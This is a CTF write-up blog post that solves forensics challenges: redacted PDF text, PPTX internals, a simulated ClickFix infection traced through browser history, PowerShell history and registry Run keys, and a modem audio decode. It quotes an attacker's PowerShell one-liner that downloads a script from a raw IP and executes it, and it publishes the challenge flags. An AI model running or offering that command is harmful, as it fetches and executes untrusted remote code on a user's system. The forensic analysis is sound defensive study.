---
layout: post
title:  "Forensics Challenges"
date:   2026-04-19 17:10:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /CTF@CIT-2026-forensics/
---
* TOC
{:toc}

## The Evil Files

**Author**: boom

**Category**: Forensics

**Description**: Dr. Evil be dreamin and schemin SHA1: `2230cff50d7ae8672ab072d275df7057773f11eb`

I get the challenge file:
```shell
sha1sum challenge.pdf  
2230cff50d7ae8672ab072d275df7057773f11eb  challenge.pdf

file challenge.pdf  
challenge.pdf: PDF document, version 1.7, 1 page(s)  
```

When I open the PDF there is text redacted: 

![Alt text](/images/redactedCIT.png)

I hit `Ctrl+A` to select all and paste it into a text document. Then I can see the full text and the flag:
```shell
FROM: laser.shark.master@villainhq.net
TO: tiny.turmoil@domination.co
CC: CIT{m0j0_eng4g3d}
Subject: RE: Plan to take over the world
Date: Thur, 15 April 2026 07:30:12 +0000
Dear Minions,
After much contemplation and evil scheming, I have decided that phase one of My World Domination Plan™ requires.. money. Lots of it. How much? I’m thinking $10 billion. No, wait.. $100 billion. Actually.. let’s be safe and round up to $1 trillion! You know what that means.. start practicing your evil laughs and your pinky-to-mouth poses. The world will soon be mine.. and possibly slightly confused! We’ve discussed phase one, but phase two requires a lot more funding. Our arsenal of gadgets must be unparalleled. Current priorities include:
1. Shrink Ray 3000™ - because world leaders telling us “no” is unacceptable!
2. Sharks With Frickin’ Laser Beams Attached to their Heads – why not?
3. Automated Evil Minion Dispensers – we’ll need loyal assistants!
Prepare yourself, for soon the world will tremble at the sound of my monologue, the glint of my pinky, and the sheer audacity of our plans. The time is nearly upon us. Success is inevitable. And, as always, remember: no ransom too large, no evil laugh too loud.
Pinky raised,
Dr. Purrington
```

Or simply use `pdfgrep`:
```shell
pdfgrep CIT challenge.pdf  
CC: CIT{m0j0_eng4g3d}
```

`CIT{m0j0_eng4g3d}`

___

## Larping 101

**Author**: boom

**Category**: Forensics

**Description**: To larp, one must become the larper.. What do you think of my presentation? It feels like it might be missing something so maybe you can tell me what it is? SHA1: `e72c9837de62168b2b5cc573a55800ea1e440b42`

I get the challenge file:
```shell
sha1sum challenge.pptx  
e72c9837de62168b2b5cc573a55800ea1e440b42  challenge.pptx  

file challenge.pptx  
challenge.pptx: Microsoft PowerPoint 2007+
```

`exiftool` shows me I can unzip the file kind of like a `.docx` or `.apk`, etc:
```shell
exiftool challenge.pptx  
ExifTool Version Number         : 13.25  
File Name                       : challenge.pptx  
Directory                       : .  
File Size                       : 1130 kB  
File Modification Date/Time     : 2026:04:17 14:33:06-04:00  
File Access Date/Time           : 2026:04:17 14:33:06-04:00  
File Inode Change Date/Time     : 2026:04:17 14:33:11-04:00  
File Permissions                : -rw-rw-r--  
File Type                       : PPTX  
File Type Extension             : pptx  
MIME Type                       : application/vnd.openxmlformats-officedocument.presentationml.presentation  
Zip Required Version            : 20  
Zip Bit Flag                    : 0  
Zip Compression                 : Deflated  
Zip Modify Date                 : 2026:04:17 01:12:02  
Zip CRC                         : 0x974e33b6  
Zip Compressed Size             : 396  
Zip Uncompressed Size           : 2478  
Zip File Name                   : [Content_Types].xml  
Template                        :  
Total Edit Time                 : 11 minutes  
Application                     : LibreOffice/26.2.1.2$Windows_X86_64 LibreOffice_project/620$Build-2  
App Version                     : 15.0000  
Create Date                     : 2026:04:16 21:00:34Z  
Creator                         :  
Description                     : This work is licensed under a Creative Commons 0 License..It makes use of the works of fsanchez.  
Language                        : en-US  
Last Modified By                :  
Modify Date                     : 2026:04:16 21:12:01Z  
Revision Number                 : 2  
Subject                         :  
Title                           : Vivid
```

I unzip the file:
```shell
unzip challenge.pptx  
Archive:  challenge.pptx  
  inflating: [Content_Types].xml  
   creating: _rels/  
  inflating: _rels/.rels  
   creating: docProps/  
  inflating: docProps/app.xml  
  inflating: docProps/core.xml  
   creating: ppt/  
   creating: ppt/_rels/  
  inflating: ppt/_rels/presentation.xml.rels  
   creating: ppt/slideLayouts/  
  inflating: ppt/slideLayouts/slideLayout2.xml  
   creating: ppt/slideLayouts/_rels/  
  inflating: ppt/slideLayouts/_rels/slideLayout5.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout3.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout1.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout2.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout4.xml.rels  
  inflating: ppt/slideLayouts/slideLayout5.xml  
  inflating: ppt/slideLayouts/slideLayout1.xml  
  inflating: ppt/slideLayouts/slideLayout3.xml  
  inflating: ppt/slideLayouts/slideLayout4.xml  
   creating: ppt/slides/  
  inflating: ppt/slides/transitions.xml  
   creating: ppt/slides/_rels/  
  inflating: ppt/slides/_rels/slide2.xml.rels  
  inflating: ppt/slides/_rels/slide4.xml.rels  
  inflating: ppt/slides/_rels/slide3.xml.rels  
  inflating: ppt/slides/_rels/slide1.xml.rels  
  inflating: ppt/slides/slide3.xml  
  inflating: ppt/slides/slide4.xml  
  inflating: ppt/slides/slide2.xml  
  inflating: ppt/slides/slide1.xml  
   creating: ppt/slideMasters/  
   creating: ppt/slideMasters/_rels/  
  inflating: ppt/slideMasters/_rels/slideMaster1.xml.rels  
  inflating: ppt/slideMasters/slideMaster1.xml  
   creating: ppt/media/  
  inflating: ppt/media/image3.png  
  inflating: ppt/media/image4.png  
  inflating: ppt/media/image1.png  
  inflating: ppt/media/image5.png  
  inflating: ppt/media/image2.png  
   creating: ppt/theme/  
  inflating: ppt/theme/theme1.xml  
  inflating: ppt/presProps.xml  
  inflating: ppt/presentation.xml
```

Quickly find the flag with `grep`:
```shell
grep -R "CIT{"  
ppt/slides/transitions.xml:            CIT{l4rp_l4rp_l4rp_s4hur}
```

`CIT{l4rp_l4rp_l4rp_s4hur}`

___

## The click that may have fixed

**Author**: boom

**Category**: Forensics

**Description**: So one of the CTF@CIT 2026 players tried to download more RAM and it seems they may have gotten pwned. They said they got to one website, but the captcha required them to run some PowerShell.. Can you identify what time that website was last visited? FLAG FORMAT: `CIT{YYYY-MM-DDThh:mm:ssZ}`. SHA1: `aa50aa4516d0bc7b0aa23139f95d38edd916164a`. 

I get the challenge files:
```shell
sha1sum challenge.zip  
aa50aa4516d0bc7b0aa23139f95d38edd916164a  challenge.zip

unzip challenge.zip  
Archive:  challenge.zip  
   creating: kurt_backup/  
   creating: kurt_backup/3D Objects/  
  inflating: kurt_backup/3D Objects/desktop.ini  
   creating: kurt_backup/AppData/  
   creating: kurt_backup/AppData/Local/  
   creating: kurt_backup/AppData/LocalLow/  
   creating: kurt_backup/AppData/LocalLow/Microsoft/  
   creating: kurt_backup/AppData/LocalLow/Microsoft/CryptnetUrlCache/  
   creating: kurt_backup/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/
   
... etc

 extracting: kurt_backup/ntuser.ini  
   creating: kurt_backup/OneDrive/  
  inflating: kurt_backup/OneDrive/desktop.ini  
   creating: kurt_backup/Pictures/  
   creating: kurt_backup/Pictures/Camera Roll/  
  inflating: kurt_backup/Pictures/Camera Roll/desktop.ini  
  inflating: kurt_backup/Pictures/desktop.ini  
   creating: kurt_backup/Pictures/Saved Pictures/  
  inflating: kurt_backup/Pictures/Saved Pictures/desktop.ini  
   creating: kurt_backup/Saved Games/  
  inflating: kurt_backup/Saved Games/desktop.ini  
   creating: kurt_backup/Searches/  
  inflating: kurt_backup/Searches/desktop.ini  
  inflating: kurt_backup/Searches/Everywhere.search-ms  
  inflating: kurt_backup/Searches/Indexed Locations.search-ms 
   creating: kurt_backup/Videos/  
  inflating: kurt_backup/Videos/desktop.ini
```

I get a backup of the windows profile. I look at web history for edge:
```shell
cd "kurt_backup/AppData/Local/Microsoft/Edge/User Data/Default/"

sqlite3 History "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url FROM urls ORDER BY last_visit_time DESC LIMIT 10;"  
2026-04-18 07:07:26|https://23.179.17.92:5067/  
2026-04-18 07:07:00|https://www.bing.com/search?q=free+ram+for+me&cvid=127dec74021041bea983737016d5ec16&aqs=edge..69i57j0l6.2601j0j1&pglt=2083&FORM=ANNTA1&PC=U531  
2026-04-18 07:06:50|http://ctf.cyber-cit.club/  
2026-04-18 07:06:50|https://ctf.cyber-cit.club/  
2026-04-18 07:05:40|https://downloadmoreram.com/  
2026-04-18 07:05:38|https://www.bing.com/search?q=download+more+ram&cvid=2f12a0df0d1e41cc97cc592f98b504e6&aqs=edge.0.0l6.2518j0j1&qs=LS&pq=download+more+r&sk=CSYN1&sc=12-15&pglt=2083&FORM=ANNTA1&PC=U531  
2026-04-18 07:05:38|https://www.bing.com/ck/a?!&&p=f1f245988a2249f2d959bde7e9f06ac35088a26a4c306f8407b53917ace238a6JmltdHM9MTc3NjQ3MDQwMA&ptn=3&ver=2&hsh=4&fclid=37176962-1186-624c-03cc-7e5d10056304&psq=download+more+ram&u=a1aHR0cHM6Ly9kb3dubG9hZG1vcmVyYW0uY29tLw&ntb=1  
2026-04-18 07:04:11|https://www.bing.com/search?q=is+there+a+way+i+can+get+download+ram&cvid=db22907dff914f95b5ac55bdf9d2948a&aqs=edge..69i57j0l6.7227j0j1&pglt=2083&FORM=ANNTA1&PC=U531  
2026-04-18 07:03:57|https://www.bing.com/search?q=ram+for+free&cvid=1c32455f94364bf3bbe046ca124e1c1c&aqs=edge.0.0l6.2961j0j1&qs=UT&pq=ram+for+fre&sk=CSYN1&sc=9-11&pglt=2083&FORM=ANNTA1&PC=U531  
2026-04-18 07:03:47|https://www.bing.com/search?q=how+do+i+download+more+ram&cvid=622bf62a75604faa8b5e31fe435177f6&aqs=edge..69i57j0l6.4216j0j1&FORM=ANNTA1&PC=U531
```

I see their bing searches for how to download more ram. Then a final suspicious request to `hxxps[://]23[.]179[.]17[.]92:5067/` at `07:07:26` on `2026-04-18`. With this info I can get the flag! 

`CIT{2026-04-18T07:07:26Z}`

___

## Autonomous

**Author**: boom

**Category**: Forensics

**Description**: Let's dig a little deeper into where this script might be coming from. What is the ASN associated clickfix site? FLAG FORMAT: `CIT{XXXXXX}`.

I find the ASN on [https://hackertarget.com/as-ip-lookup/](https://hackertarget.com/as-ip-lookup/). Just search for the IP `23.179.17.92`.

`CIT{399562}`

___

## Ping Pong

**Author**: boom

**Category**: Forensics

**Description**: What website does the PowerShell script they executed ping? FLAG FORMAT: `CIT{website}`.

For this just check the powershell history:
```shell
cd "kurt_backup/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/"

cat ConsoleHost_history.txt  
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser 
$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c
```

`CIT{unewhaven.com}`

___

## Start Me Up

**Author**: boom

**Category**: Forensics

**Description**: Are we dealing with TrickBot here or something? What's with the persistence?! Use the `challenge.zip` from "The click that may have fixed" to solve this challenge :)

To check for persistance I start with checking the startup folder:
```shell
cd "kurt_backup/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

ls  
desktop.ini  e9fje2.txt  

cat e9fje2.txt  
Q0lUe3N0NHJ0X20zX3VwX2kxMV9uM3Yzcl9zdDBwfQ==  

echo 'Q0lUe3N0NHJ0X20zX3VwX2kxMV9uM3Yzcl9zdDBwfQ==' | base64 -d  
CIT{st4rt_m3_up_i11_n3v3r_st0p}
```

`CIT{st4rt_m3_up_i11_n3v3r_st0p}`

___

## You gotta run, run, run, run, run

**Author**: boom

**Category**: Forensics

**Description**: Waiter, waiter! More persistence mechanisms please!!

Yet another persistence mechanism seems to have been setup. It's funny because I remember the user saying everytime they logged into their system, something just felt odd when they'd see some sort of black box flash on their screen. There must be a name associated with what this is.. SHA1: `cc0060d01e8dc3fe69a8ca888c203bc9e57959e1`. FLAG FORMAT: `CIT{XXXXXXXXXXXX}`.

I get the challenge file:
```shell
sha1sum challenge.dat  
cc0060d01e8dc3fe69a8ca888c203bc9e57959e1  challenge.dat  

file challenge.dat  
challenge.dat: MS Windows registry file, NT/2000 or above
```

I find a malicious run key entry:
```shell
regripper -r challenge.dat -p run  
Launching run v.20200511  
run v.20200511  
(Software, NTUSER.DAT) [Autostart] Get autostart key contents from Software hive  
  
Software\Microsoft\Windows\CurrentVersion\Run  
LastWrite Time 2026-04-18 07:07:52Z  
  AzureTenant - "C:\Users\kurt\AppData\Roaming\fj3493.exe"  
  OneDrive - "C:\Users\kurt\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
  
... etc
```

`OneDrive` is a legitimate entry, but `AzureTenant` points to a randomly named executable in `AppData/Roaming`. The attacker added an entry that launches `fj3493.exe` every time the user logs in.

`CIT{AzureTenant}`

___

## Wiretap

**Author**: hypnos

**Category**: Forensics

**Description**: Ton, they're listening to the phones meet me down at the badabing. SHA1: `fb8ef1616ef3e993e81d7f23f9d56b76d51175be`.

I get the challenge file:
```shell
sha1sum beep_beep_boop.wav  
fb8ef1616ef3e993e81d7f23f9d56b76d51175be  beep_beep_boop.wav  

file beep_beep_boop.wav  
beep_beep_boop.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 44100 Hz
```

The file in audacity:

![Alt text](/images/beepboopspectro.png)

The file sounds like a modem. I put it into [https://www.modembin.com/decode](https://www.modembin.com/decode) and I got this output (at `Bell 103, 300 Baud`):
```shell
-GET /SiliconValley/Heights/4721/diary.html HTTP/1.0
Host: www.geocities.com
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)

[
```

I use `minimodem` to test different frequency pairs (mark and space) until the output contains printable characters:
```shell
# request
minimodem --rx -f beep_beep_boop.wav -M 1270 -S 1070 300 2>/dev/null | strings  
~~????  
~~~~~???  
GET /SiliconValley/Heights/4721/diary.html HTTP/1.0  
Host: www.geocities.com  
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)

# response
minimodem --rx -f beep_beep_boop.wav -M 2225 -S 2025 300 2>/dev/null | strings  
HTTP/1.0 200 OK  
Server: Apache/1.3.6 (Unix)  
Content-Type: text/html  
Content-Length: 6519  
Connection: close
<!DOCTYPE html>
<html>
<head>
<title>Dave's Corner of the 'Net!</title>
<style>
body{background:#000080;color:#ff0;font-family:"Comic Sans MS",Arial,sans-serif}
h1{color:#f0f;text-align:center;font-size:28pt}
h2{color:#0f0}
.entry{background:#fff;color:#000;border:3px ridge silver;padding:10px;margin:10px 20px}
.manual{background:#000;padding:10px;border:2px inset gray;text-align:center}
.manual svg{display:block;margin:4px auto}
.counter{background:#000;color:#f00;font-family:monospace;padding:2px 6px;border:1px solid #fff}
a{color:#0ff} a:visited{color:#ff69b4}
</style>
</head>
<body>
<center>
<h1>~*~ Dave's Corner of the 'Net ~*~</h1>
<p><b>*** UNDER CONSTRUCTION ***</b></p>
<marquee>Welcome to my homepage!!! Sign the guestbook before you leave!!!</marquee>
<hr>
</center>
<div class="entry">
<h2>11/14/98 -- NEW MODEM DAY!!!</h2>
<p>Hey everybody, Dave here!! :-)  Guess what came in the mail today??
My parents FINALLY caved and let me order the <b>USRobotics Sportster
56k V.90</b> from the Best Buy catalog and the UPS guy dropped it off
this morning!!!</p>
<p>Let me tell you folks, I hooked this baby up to the second phone
line (no more getting booted offline when sis calls her dumb boyfriend,
LOL) and WOW. I downloaded a whole MIDI of Mambo No. 5 in like 12
seconds flat. TWELVE SECONDS. The future is NOW.</p>
<p>Anyway while I was flippin thru the owner's manual (yes I read 'em,
don't @ me) I got to page 47 and there was this dorky little pixel-art
graphic printed at the bottom that looked like it did NOT belong. It
was split across 3 lil scanlines. Probably some easter egg the nerds
at USR snuck past the editor?? I scanned 'em with my Mustek flatbed
(300 DPI, look at me go) and saved 'em as GIFs. Can any of you cool
cats out there tell me what these little pictures are supposed to
spell out???</p>
<div class="manual">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 78 7" width="468" height="42" shape-rendering="crispEdges"><path d="M1,0h4v1h-4M0,1h1v1h-1M0,2h1v1h-1M0,3h1v1h-1M0,4h1v1h-1M0,5h1v1h-1M1,6h4v1h-4M7,0h3v1h-3M8,1h1v1h-1M8,2h1v1h-1M8,3h1v1h-1M8,4h1v1h-1M8,5h1v1h-1M7,6h3v1h-3M12,0h5v1h-5M14,1h1v1h-1M14,2h1v1h-1M14,3h1v1h-1M14,4h1v1h-1M14,5h1v1h-1M14,6h1v1h-1M21,0h2v1h-2M20,1h1v1h-1M20,2h1v1h-1M19,3h1v1h-1M20,4h1v1h-1M20,5h1v1h-1M21,6h2v1h-2M25,2h3v1h-3M24,3h1v1h-1M27,3h1v1h-1M25,4h3v1h-3M27,5h1v1h-1M25,6h2v1h-2M31,0h3v1h-3M30,1h1v1h-1M34,1h1v1h-1M34,2h1v1h-1M32,3h2v1h-2M34,4h1v1h-1M30,5h1v1h-1M34,5h1v1h-1M31,6h3v1h-3M38,0h1v1h-1M38,1h1v1h-1M37,2h3v1h-3M38,3h1v1h-1M38,4h1v1h-1M38,5h1v1h-1M39,6h2v1h-2M42,6h5v1h-5M49,0h3v1h-3M48,1h1v1h-1M51,1h2v1h-2M48,2h1v1h-1M50,2h1v1h-1M52,2h1v1h-1M48,3h1v1h-1M50,3h1v1h-1M52,3h1v1h-1M48,4h1v1h-1M50,4h1v1h-1M52,4h1v1h-1M48,5h2v1h-2M52,5h1v1h-1M49,6h3v1h-3M56,0h2v1h-2M55,1h1v1h-1M54,2h3v1h-3M55,3h1v1h-1M55,4h1v1h-1M55,5h1v1h-1M55,6h1v1h-1M62,0h2v1h-2M61,1h1v1h-1M60,2h3v1h-3M61,3h1v1h-1M61,4h1v1h-1M61,5h1v1h-1M61,6h1v1h-1M66,6h5v1h-5M74,0h1v1h-1M74,1h1v1h-1M73,2h3v1h-3M74,3h1v1h-1M74,4h1v1h-1M74,5h1v1h-1M75,6h2v1h-2" fill="#00ff41"/></svg>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 7" width="504" height="42" shape-rendering="crispEdges"><path d="M0,0h1v1h-1M0,1h1v1h-1M0,2h1v1h-1M2,2h2v1h-2M0,3h2v1h-2M4,3h1v1h-1M0,4h1v1h-1M4,4h1v1h-1M0,5h1v1h-1M4,5h1v1h-1M0,6h1v1h-1M4,6h1v1h-1M7,0h3v1h-3M6,1h1v1h-1M10,1h1v1h-1M10,2h1v1h-1M8,3h2v1h-2M10,4h1v1h-1M6,5h1v1h-1M10,5h1v1h-1M7,6h3v1h-3M12,6h5v1h-5M18,2h4v1h-4M18,3h1v1h-1M22,3h1v1h-1M18,4h1v1h-1M22,4h1v1h-1M18,5h4v1h-4M18,6h1v1h-1M24,0h1v1h-1M24,1h1v1h-1M24,2h1v1h-1M26,2h2v1h-2M24,3h2v1h-2M28,3h1v1h-1M24,4h1v1h-1M28,4h1v1h-1M24,5h1v1h-1M28,5h1v1h-1M24,6h1v1h-1M28,6h1v1h-1M31,0h3v1h-3M30,1h1v1h-1M33,1h2v1h-2M30,2h1v1h-1M32,2h1v1h-1M34,2h1v1h-1M30,3h1v1h-1M32,3h1v1h-1M34,3h1v1h-1M30,4h1v1h-1M32,4h1v1h-1M34,4h1v1h-1M30,5h2v1h-2M34,5h1v1h-1M31,6h3v1h-3M36,2h1v1h-1M38,2h2v1h-2M36,3h2v1h-2M40,3h1v1h-1M36,4h1v1h-1M40,4h1v1h-1M36,5h1v1h-1M40,5h1v1h-1M36,6h1v1h-1M40,6h1v1h-1M43,0h3v1h-3M42,1h1v1h-1M46,1h1v1h-1M46,2h1v1h-1M44,3h2v1h-2M46,4h1v1h-1M42,5h1v1h-1M46,5h1v1h-1M43,6h3v1h-3M48,6h5v1h-5M55,0h2v1h-2M54,1h1v1h-1M56,1h1v1h-1M56,2h1v1h-1M56,3h1v1h-1M56,4h1v1h-1M56,5h1v1h-1M55,6h3v1h-3M60,2h2v1h-2M63,2h2v1h-2M60,3h1v1h-1M62,3h1v1h-1M64,3h1v1h-1M60,4h1v1h-1M62,4h1v1h-1M64,4h1v1h-1M60,5h1v1h-1M64,5h1v1h-1M60,6h1v1h-1M64,6h1v1h-1M66,6h5v1h-5M73,0h3v1h-3M72,1h1v1h-1M75,1h2v1h-2M72,2h1v1h-1M74,2h1v1h-1M76,2h1v1h-1M72,3h1v1h-1M74,3h1v1h-1M76,3h1v1h-1M72,4h1v1h-1M74,4h1v1h-1M76,4h1v1h-1M72,5h2v1h-2M76,5h1v1h-1M73,6h3v1h-3M78,2h1v1h-1M80,2h2v1h-2M78,3h2v1h-2M82,3h1v1h-1M78,4h1v1h-1M82,4h1v1h-1M78,5h1v1h-1M82,5h1v1h-1M78,6h1v1h-1M82,6h1v1h-1" fill="#00ff41"/></svg>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 7" width="504" height="42" shape-rendering="crispEdges"><path d="M0,6h5v1h-5M8,0h1v1h-1M8,1h1v1h-1M7,2h3v1h-3M8,3h1v1h-1M8,4h1v1h-1M8,5h1v1h-1M9,6h2v1h-2M12,0h1v1h-1M12,1h1v1h-1M12,2h1v1h-1M14,2h2v1h-2M12,3h2v1h-2M16,3h1v1h-1M12,4h1v1h-1M16,4h1v1h-1M12,5h1v1h-1M16,5h1v1h-1M12,6h1v1h-1M16,6h1v1h-1M19,0h3v1h-3M18,1h1v1h-1M22,1h1v1h-1M22,2h1v1h-1M20,3h2v1h-2M22,4h1v1h-1M18,5h1v1h-1M22,5h1v1h-1M19,6h3v1h-3M24,6h5v1h-5M31,0h2v1h-2M30,1h1v1h-1M32,1h1v1h-1M32,2h1v1h-1M32,3h1v1h-1M32,4h1v1h-1M32,5h1v1h-1M31,6h3v1h-3M36,2h1v1h-1M38,2h2v1h-2M36,3h2v1h-2M40,3h1v1h-1M36,4h1v1h-1M40,4h1v1h-1M36,5h1v1h-1M40,5h1v1h-1M36,6h1v1h-1M40,6h1v1h-1M44,0h1v1h-1M44,1h1v1h-1M43,2h3v1h-3M44,3h1v1h-1M44,4h1v1h-1M44,5h1v1h-1M45,6h2v1h-2M49,2h3v1h-3M48,3h1v1h-1M52,3h1v1h-1M48,4h5v1h-5M48,5h1v1h-1M49,6h3v1h-3M54,2h1v1h-1M56,2h2v1h-2M54,3h2v1h-2M58,3h1v1h-1M54,4h1v1h-1M54,5h1v1h-1M54,6h1v1h-1M60,2h1v1h-1M62,2h2v1h-2M60,3h2v1h-2M64,3h1v1h-1M60,4h1v1h-1M64,4h1v1h-1M60,5h1v1h-1M64,5h1v1h-1M60,6h1v1h-1M64,6h1v1h-1M67,0h3v1h-3M66,1h1v1h-1M70,1h1v1h-1M70,2h1v1h-1M68,3h2v1h-2M70,4h1v1h-1M66,5h1v1h-1M70,5h1v1h-1M67,6h3v1h-3M74,0h1v1h-1M74,1h1v1h-1M73,2h3v1h-3M74,3h1v1h-1M74,4h1v1h-1M74,5h1v1h-1M75,6h2v1h-2M78,0h2v1h-2M80,1h1v1h-1M80,2h1v1h-1M81,3h1v1h-1M80,4h1v1h-1M80,5h1v1h-1M78,6h2v1h-2" fill="#00ff41"/></svg>
</div>
<p>Weird right? If you figure out what it says, drop me a line at
<a href="mailto:CyberDave98@aol.com">CyberDave98@aol.com</a> or hit me
up on AIM (same s/n). Peace out!!!</p>
<p><i>-- Dave</i></p>
</div>
<center>
<hr>
<p>Visitors since 04/12/98: <span class="counter">0000142</span></p>
<p><small>Proud member of the <b>GeoCities Dial-Up Webring</b></small></p>
<p><small>Best viewed in Netscape Navigator 4.0 @ 800x600</small></p>
<p><small>(c) 1998 Dave M. -- All Rights Reserved</small></p>
</center>
</body>
</html>
```

The response to the request! To easily view it I start a local webserver and visit the page:

![Alt text](/images/forensicsmodem.png)

I realized later I was way over complicating the minimodem command. I just need to run `minimodem --rx 300 -a -f beep_beep_boop.wav` to get the reponse.

`CIT{g3t_0ff_th3_ph0n3_1m_0n_th3_1ntern3t}`
